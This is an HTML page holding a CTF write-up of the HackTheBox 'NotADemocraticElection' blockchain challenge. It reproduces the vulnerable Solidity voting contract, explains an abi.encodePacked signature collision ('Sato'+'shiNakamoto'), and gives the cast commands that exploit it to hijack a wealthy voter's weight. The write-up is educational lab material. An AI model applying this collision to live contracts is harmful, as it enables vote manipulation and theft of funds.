@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="" />
+  <meta property="og:image" content="https://wepfen.github.io//images/avatar.png" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/notademocraticelection/">
+  <meta property="og:title" content="HTB Business CTF 2024 - NotADemocraticElection [blockchain]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/notademocraticelection/">
+  <meta name="twitter:title" content="HTB Business CTF 2024 - NotADemocraticElection [blockchain]">
+  <meta name="twitter:description" content="">
+  <meta name="twitter:image" content="https://wepfen.github.io//images/avatar.png">
+  
+  <title>
+    
+      HTB Business CTF 2024 - NotADemocraticElection [blockchain]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2024-05-31 20:58:24 &#43;0200 CEST">
+            2024-05-31
+        </time>
+    </p>
+
+    <h1>HTB Business CTF 2024 - NotADemocraticElection [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#code-reading">Code reading</a></li>
+      </ul>
+    </li>
+    <li><a href="#solve">Solve</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : easy</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks2600</p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/hackthebox/business-ctf-2024/tree/main/blockchain/NotADemocraticElection%20%5BEasy%5D"> Source files </a></p>
+</blockquote>
+<blockquote>
+<p>In the post-apocalyptic wasteland, the remnants of human and machine factions vie for control over the last vestiges of civilization. The Automata Liberation Front (ALF) and the Cyborgs Independence Movement (CIM) are the two primary parties seeking to establish dominance. In this harsh and desolate world, democracy has taken a backseat, and power is conveyed by wealth. Will you be able to bring back some Democracy in this hopeless land?</p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>We have to make a political party &ldquo;CIM&rdquo; win by raising its votes above 1000 * 10^18 votes (we can notice that 10^18 wei = 1ether).</p>
+<h1 id="recon">Recon</h1>
+<h2 id="code-reading">Code reading</h2>
+<p>NotADemocraticElection.sol</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">83
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> NotADemocraticElection {
+</span></span><span style="display:flex;"><span>    <span style="color:#859289;font-style:italic">// ****************************************************
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    <span style="color:#859289;font-style:italic">// ******* NOTE: THIS NOT A DEMOCRATIC ELECTION *******
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    <span style="color:#859289;font-style:italic">// ****************************************************
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">constant</span> TARGET_VOTES <span style="color:#7a8478">=</span> <span style="color:#d699b6">1000</span>e18;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">struct</span> Party {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span>  fullname;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> totalvotes;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">struct</span> Voter {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> weight;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> addr;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">bytes3</span> _id <span style="color:#7a8478">=&gt;</span> Party) <span style="color:#e67e80">public</span> parties;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">bytes</span> _sig <span style="color:#7a8478">=&gt;</span> Voter) <span style="color:#e67e80">public</span> voters;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">string</span> _name <span style="color:#7a8478">=&gt;</span> <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">string</span> _surname <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">address</span> _addr)) <span style="color:#e67e80">public</span> uniqueVoters;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes3</span> <span style="color:#e67e80">public</span> winner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> Voted(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> _voter,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes3</span>  _party
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> VoterDeposited(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> _voter,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> _weight
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> ElectionWinner(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes3</span> _party
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(
+</span></span><span style="display:flex;"><span>       <span style="color:#dbbc7f">bytes3</span> _partyAsymbol , <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _partyAfullname,
+</span></span><span style="display:flex;"><span>       <span style="color:#dbbc7f">bytes3</span> _partyBsymbol , <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _partyBfullname
+</span></span><span style="display:flex;"><span>    ) {
+</span></span><span style="display:flex;"><span>        parties[_partyAsymbol].fullname <span style="color:#7a8478">=</span> _partyAfullname;
+</span></span><span style="display:flex;"><span>        parties[_partyBsymbol].fullname <span style="color:#7a8478">=</span> _partyBfullname;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">getVotesCount</span>(<span style="color:#dbbc7f">bytes3</span> _party) <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> parties[_party].totalvotes;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">getVoterSig</span>(<span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _name, <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _surname) <span style="color:#e67e80">public</span> <span style="color:#e67e80">pure</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bytes</span> <span style="color:#e67e80">memory</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> <span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(_name, _surname);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">checkWinner</span>(<span style="color:#dbbc7f">bytes3</span> _party) <span style="color:#e67e80">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (parties[_party].totalvotes <span style="color:#7a8478">&gt;=</span> TARGET_VOTES) {
+</span></span><span style="display:flex;"><span>            winner <span style="color:#7a8478">=</span> _party; 
+</span></span><span style="display:flex;"><span>            emit ElectionWinner(_party);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">depositVoteCollateral</span>(<span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _name, <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _surname) <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(uniqueVoters[_name][_surname] <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>), <span style="color:#b2c98f">&#34;Already deposited&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes</span> <span style="color:#e67e80">memory</span> voterSig <span style="color:#7a8478">=</span> getVoterSig(_name, _surname);
+</span></span><span style="display:flex;"><span>        voters[voterSig].weight <span style="color:#7a8478">+=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>;
+</span></span><span style="display:flex;"><span>        uniqueVoters[_name][_surname] <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit VoterDeposited(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">vote</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes3</span> _party,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _name,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span> <span style="color:#e67e80">memory</span> _surname
+</span></span><span style="display:flex;"><span>    ) <span style="color:#e67e80">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(uniqueVoters[_name][_surname] <span style="color:#7a8478">==</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#b2c98f">&#34;You cannot vote on behalf of others.&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes</span> <span style="color:#e67e80">memory</span> voterSig <span style="color:#7a8478">=</span> getVoterSig(_name, _surname);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> voterWeight <span style="color:#7a8478">=</span> voters[voterSig].weight <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span> <span style="color:#7a8478">?</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">:</span> voters[voterSig].weight;
+</span></span><span style="display:flex;"><span>        parties[_party].totalvotes <span style="color:#7a8478">+=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">*</span> voterWeight;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        emit Voted(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, _party);
+</span></span><span style="display:flex;"><span>        checkWinner(_party);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>You can register to vote by submitting your name and surname, and if you transfer ether your vote will carry more weight (I&rsquo;m getting a kick out of this representation of corruption). A vote count 10 times if it&rsquo;s weight is 10.</li>
+<li>When the contract is initialized, there&rsquo;s a member who&rsquo;s already registered with 100 ether = 100 * 10^18 (they can whippin everything by casting just 10 votes)</li>
+<li>His name is Satoshi Nakamoto</li>
+<li>Of course, you can&rsquo;t vote for someone else.</li>
+<li>There&rsquo;s a verification process based on the address that REGISTERED the person and the address that CARRIED out the vote.</li>
+<li>If the address is verified, the code will take the voter&rsquo;s first and last name signature by doing: abiEncodePacked(first name, last name)</li>
+<li>This function is vulnerable because if I register a person called &ldquo;Sato shiNakamoto&rdquo;, his signature will be the same as that of &ldquo;Satoshi Nakamoto&rdquo; (everything is concatenated).</li>
+<li>Documentation mentioning <a href="https://docs.soliditylang.org/en/latest/abi-spec.html">the flaw</a>.</li>
+<li>Then all I have to do is vote with the fraudulent voter I&rsquo;ve just created.</li>
+</ul>
+<h1 id="solve">Solve</h1>
+<p>Steps to resolve:</p>
+<ul>
+<li>Start the instance and retrieve the addresses</li>
+<li>Make a call to depositVoteCollatoral with the following parameters: &ldquo;Sato&rdquo; &ldquo;shiNakamoto&rdquo; (could have been &ldquo;Sat&rdquo; &ldquo;oshiNakamoto&rdquo; etc)</li>
+<li>Vote 10 times</li>
+<li>Claim the flag</li>
+</ul>
+<p>In commands it looks like this:</p>
+<p><code>cast send $TARGET -r $RPC_URL --from $ATTACKER --private-key $PRIVATE_KEY &quot;depositVoteCollateral(string,string)&quot; Sato shiNakamoto</code></p>
+<ul>
+<li>
+<p>We vote for our favorite party 10 times: <code>cast send $TARGET --private-key $PRIVATE_KEY -r $RPC_URL &quot;vote(bytes3,string,string)&quot; 0x43494d Sato shiNakamoto</code> (execute the command 1 time like a clueless man, we&rsquo;re not scripting here)</p>
+</li>
+<li>
+<p>You can check the number of votes with <code>cast call $TARGET -r $RPC_URL &quot;getVotesCount(bytes3)&quot; 0x43494d</code>. Where &ldquo;0x43494d&rdquo; is &ldquo;CIM&rdquo; in hex.</p>
+</li>
+</ul>
+<p><code>HTB{h4sh_c0ll1s10n...}</code></p>
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
